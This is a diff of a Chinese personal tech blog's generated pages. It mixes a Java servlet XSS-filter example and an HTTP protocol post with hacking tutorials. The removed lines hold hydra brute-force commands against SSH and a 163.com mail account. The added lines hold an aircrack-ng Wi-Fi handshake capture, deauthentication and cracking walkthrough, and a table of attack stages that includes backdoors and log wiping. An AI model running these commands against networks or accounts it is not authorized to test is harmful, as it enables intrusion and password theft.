-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">=============================</span><br><span class="line">package com.what21.filter.xss;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Set;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"></span><br><span class="line">public final class HttpRequestWrapper extends HttpServletRequestWrapper &#123;</span><br><span class="line"></span><br><span class="line">    private Map&lt;String, String&gt; xssMap;</span><br><span class="line"></span><br><span class="line">    public HttpRequestWrapper(HttpServletRequest request) &#123;</span><br><span class="line">        super(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public HttpRequestWrapper(HttpServletRequest request,</span><br><span class="line">            Map&lt;String, String&gt; xssMap) &#123;</span><br><span class="line">        super(request);</span><br><span class="line">        this.xssMap = xssMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String[] getParameterValues(String parameter) &#123;</span><br><span class="line">        String[] values = super.getParameterValues(parameter);</span><br><span class="line">        if (values == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        int count = values.length;</span><br><span class="line">        // 遍历每一个参数，检查是否含有</span><br><span class="line">        String[] encodedValues = new String[count];</span><br><span class="line">        for (int i = 0; i &lt; count; i++) &#123;</span><br><span class="line">            encodedValues[i] = cleanXSS(values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return encodedValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getParameter(String parameter) &#123;</span><br><span class="line">        String value = super.getParameter(parameter);</span><br><span class="line">        if (value == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        return cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getHeader(String name) &#123;</span><br><span class="line">        String value = super.getHeader(name);</span><br><span class="line">        if (value == null)</span><br><span class="line">            return null;</span><br><span class="line">        return cleanXSS(value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">     * 清除恶意的XSS脚本</span><br><span class="line">     *</span><br><span class="line">     * @param value</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    private String cleanXSS(String value) &#123;</span><br><span class="line">        Set&lt;String&gt; keySet = xssMap.keySet();</span><br><span class="line">        for(String key : keySet)&#123;</span><br><span class="line">            String v = xssMap.get(key);</span><br><span class="line">            value = value.replaceAll(key,v);</span><br><span class="line">        &#125;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">=============================================================================</span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;XSSFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.what21.filter.xss.XSSFilter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;XSSFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>
+            <table>
+<thead>
+<tr>
+<th style="text-align:left">分类</th>
+<th style="text-align:left">描述内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">信息收集</td>
+<td style="text-align:left">收集域名、服务器ip、指纹</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞挖掘</td>
+<td style="text-align:left">组件指纹、应用层</td>
+</tr>
+<tr>
+<td style="text-align:left">漏洞利用</td>
+<td style="text-align:left">目的、ddos、</td>
+</tr>
+<tr>
+<td style="text-align:left">权限提升</td>
+<td style="text-align:left">提升shell权限</td>
+</tr>
+<tr>
+<td style="text-align:left">后门</td>
+<td style="text-align:left">留下下次访问后门 肉鸡</td>
+</tr>
+<tr>
+<td style="text-align:left">日志清扫</td>
+<td style="text-align:left">删除系统日志</td>
+</tr>
+<tr>
+<td style="text-align:left">经验总结</td>
+<td style="text-align:left">记录攻击漏洞、肉鸡ip</td>
+</tr>
+</tbody>
+</table>
+<p>{———-}<br><img src="http://upload-images.jianshu.io/upload_images/6434888-b92aa8e517475659.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="套路总结.jpg"></p>
+<p>别人总结的　<br>如有侵犯　请私信　　哈哈．．．</p>
+
           
         
       
@@ -1340,20 +1322,6 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
       <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
       
     </li>
@@ -1361,7 +1329,21 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
       
     </li>
   
@@ -1565,7 +1547,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
       
     </li>
   
@@ -1579,7 +1561,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
       
     </li>
   
@@ -1636,7 +1618,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/ssh-violence/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/wifi-violence/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1656,7 +1638,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/hack/ssh-violence/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">ssh远程登陆破解</a>
+                <a href="/2018/03/24/hack/wifi-violence/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">wifi破解</a>
               
             
           </h2>
@@ -1751,8 +1733,8 @@
       
         
           
-            <p>利用ssh协议 暴力破解ssh密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh</span><br><span class="line">ssh 端口22 破解</span><br><span class="line"></span><br><span class="line"># hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp</span><br><span class="line">邮箱破解 现在都加了许多验证.怕是不太靠谱了</span><br></pre></td></tr></table></figure>
+            <p>利用网卡监控模式<br>监控wifi热点 .然后强制断开用户与路由连接.利用用户与路由四次握手机会获取握手包.然后跑字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># airmon-ng</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># airmon-ng start wlan0</span><br><span class="line">#wlan0为 上一个命令的Interface</span><br><span class="line"></span><br><span class="line"># airodump-ng wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon</span><br><span class="line">-c 6:表示信道6 (ch)</span><br><span class="line"></span><br><span class="line"># aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br><span class="line"></span><br><span class="line"># airmon-ng stop wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br><span class="line">#跑字典</span><br></pre></td></tr></table></figure>
 
           
         
@@ -1782,7 +1764,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
       
     </li>
   
@@ -1796,7 +1778,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
       
     </li>
   
@@ -1853,7 +1835,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/agreement/amqp/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/agreement/http/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1873,7 +1855,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/agreement/amqp/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">AMQP</a>
+                <a href="/2018/03/24/agreement/http/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">http协议</a>
               
             
           </h2>
@@ -1975,14 +1957,13 @@
       
         
           
-            <p>AMQP，即Advanced Message Queuing Protocol、高级队列消息协议</p>
-<p>一个提供统一消息服务的应用层标准高级消息队列协议,是应用层协议的一个开放标准,为面向消息的中间件设计。<br>基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。<br>Erlang中的实现有 RabbitMQ等。</p>
-<p><strong>协议特性</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、消息方向</span><br><span class="line">2、消息队列</span><br><span class="line">3、消息路由</span><br><span class="line">4、消息可靠性</span><br><span class="line">5、消息安全性</span><br></pre></td></tr></table></figure>
+            <p>http协议<br><img src="http://upload-images.jianshu.io/upload_images/6434888-2a523de3228d986b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="发展年历"></p>
 <p>{———-}</p>
-<p><strong>协议元素</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、producer---生产者</span><br><span class="line">2、consumer---消费者</span><br><span class="line">3、virtual host --虚拟主机</span><br><span class="line">4、exchange----交换器</span><br><span class="line">5、queue----消息队列</span><br><span class="line">6、message--消息</span><br></pre></td></tr></table></figure>
-<p>定义了 消息发送过程 以及消息系统必须的特性和<br>具体的消息流转实现   发送方式 可以看看RabbitMQ　消息发送流程<br>rabbitMQ严格按照AMQP协议定制实现的</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-cdf479dfba52d38b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="97年协定1.1"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-fdc25911c760f33f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="http数据流向图"></p>
+<p>HTTP　定义了　消息发送流程与信息格式</p>
+<p>发送端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、请求行</span><br><span class="line">2、请求头</span><br><span class="line">3、请求体</span><br></pre></td></tr></table></figure></p>
+<p>接受端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、响应行</span><br><span class="line">2、响应头</span><br><span class="line">3、响应体</span><br></pre></td></tr></table></figure></p>
 
           
         
@@ -1998,6 +1979,20 @@
     <li class="popular-posts-item">
       
       
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/https/" rel="bookmark">Https协议</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/amqp/" rel="bookmark">AMQP</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
       <div class="popular-posts-title"><a href="/2018/03/24/agreement/rpc/" rel="bookmark">RPC</a></div>
       
     </li>
@@ -2006,20 +2001,6 @@
       
       
       <div class="popular-posts-title"><a href="/2018/03/24/agreement/about-agreement/" rel="bookmark">关于协议</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/http/" rel="bookmark">http协议</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/https/" rel="bookmark">Https协议</a></div>
       
     </li>
   
